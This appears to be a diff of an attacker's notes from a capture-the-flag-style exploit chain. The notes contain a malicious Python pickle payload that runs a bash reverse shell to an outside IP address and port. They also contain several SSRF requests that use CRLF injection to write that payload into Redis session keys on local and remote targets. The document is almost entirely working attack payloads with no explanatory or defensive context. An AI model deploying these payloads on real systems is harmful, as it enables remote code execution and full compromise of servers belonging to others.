@@ -1,7 +1,13 @@
 b"\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
 
+
 (local dbg)SET "session:1de76862-b3f7-423b-8aa2-1b1da7be8a80" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
-(local POST) url=http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:1de76862-b3f7-423b-8aa2-1b1da7be8a80" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."%0D%0A
+(ref POST) url=http://redis:6379/?q=HTTP/1.1%0D%0ASET SESSION PAYLOAD%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A
+(ref POST) url=http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:6d26c261-bd00-4c9f-a89f-55314f240a3f" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A
+
+
+(local POST) url=http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:6d26c261-bd00-4c9f-a89f-55314f240a3f" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."%0D%0A
+
 
 (remote dbg) SET "session:05e6a41b-5d59-4413-8ac5-11337bd68d97" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."
 (remote POST) url=http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:05e6a41b-5d59-4413-8ac5-11337bd68d97" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'q\x01\x85q\x02Rq\x03."%0D%0A%0D%0A%0D%0A
